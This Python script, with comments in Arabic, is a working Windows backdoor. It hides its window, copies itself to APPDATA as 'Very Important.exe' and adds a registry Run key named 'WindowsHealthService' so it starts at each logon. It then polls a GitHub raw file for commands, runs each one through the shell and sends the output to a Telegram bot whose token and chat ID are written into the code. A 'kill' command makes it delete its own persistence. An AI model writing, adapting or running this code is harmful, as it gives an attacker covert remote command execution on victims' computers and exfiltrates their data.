import os, sys, shutil, subprocess, base64, time, requests

# إعدادات الصمت
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0

BOT_TOKEN = "8253181046:AAGwhrXiZU02eCt54pAGwpKuxTkJ7t4YRRI"
CHAT_ID = "6012820754"
# متغير لتخزين آخر أمر تم تنفيذه عشان ميتكررش
last_cmd = ""

def set_persistence():
    try:
        app_data = os.getenv("APPDATA")
        target_dir = os.path.join(app_data, "WindowsHealth")
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        target_path = os.path.join(target_dir, "Very Important.exe")
        if not os.path.exists(target_path) and ".exe" in sys.executable:
            shutil.copyfile(sys.executable, target_path)
            reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsHealthService" /t REG_SZ /d "{target_path}" /f'
            subprocess.run(reg_cmd, shell=True, startupinfo=si)
    except: pass

def beacon_logic():
    global last_cmd
    CMD_URL = "https://raw.githubusercontent.com/b1do404/My-Python-Practise/refs/heads/main/test/cmd.txt"
    while True:
        try:
            # إضافة Timestamp وإلغاء الـ Cache تماماً
            r = requests.get(f"{CMD_URL}?t={int(time.time())}", timeout=5)
            cmd = r.text.strip()
            
            # لو الأمر اتغير ومفتوح (مش sleep) نفذه
            if cmd != last_cmd and cmd.lower() != "sleep" and cmd != "":
                if cmd.lower() == "kill":
                    # مسح الريجستري وقفل البرنامج
                    subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsHealthService" /f', shell=True, startupinfo=si)
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "💀 Self-Destruct Complete."})
                    os._exit(0)
                
                # تنفيذ الأمر
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, startupinfo=si)
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                              data={"chat_id": CHAT_ID, "text": f"🚀 Result:\n{output.decode('utf-8', errors='ignore')}"})
                
                # تحديث آخر أمر تم تنفيذه
                last_cmd = cmd
            
            # الانتظار بقى 5 ثواني بس لسرعة الاستجابة
            time.sleep(5) 
        except Exception:
            time.sleep(10)

if __name__ == "__main__":
    set_persistence()
    beacon_logic()
